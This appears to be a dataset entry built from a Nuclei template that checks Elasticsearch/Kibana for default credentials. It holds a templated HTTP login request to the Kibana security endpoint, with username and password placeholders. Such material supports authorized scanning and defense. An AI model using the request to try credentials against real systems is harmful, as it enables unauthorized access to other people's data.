# Vulnerability: ElasticSearch - Default Login
**Classification:** DEFAULT-LOGIN
**Source:** Nuclei Template (`elasticsearch-default-login.yaml`)

## Description
Elasticsearch default credentials were discovered.

## Vulnerable Code Pattern / Exploit Payload
```http
POST /internal/security/login HTTP/1.1
Host: {{Hostname}}
User-Agent: Mozilla/5.0 (Windows; Windows NT 10.1; Win64; x64; en-US) Gecko/20100101 Firefox/49.5
Referer: {{RootURL}}/login
Content-Type: application/json
kbn-version: 8.8.2
x-kbn-context: %7B%22name%22%3A%22security_login%22%2C%22url%22%3A%22%2Flogin%22%7D
Origin: {{RootURL}}

{"providerType":"basic","providerName":"basic","currentURL":"{{BaseURL}}/login","params":{"username":"{{username}}","password":"{{password}}" }}
```

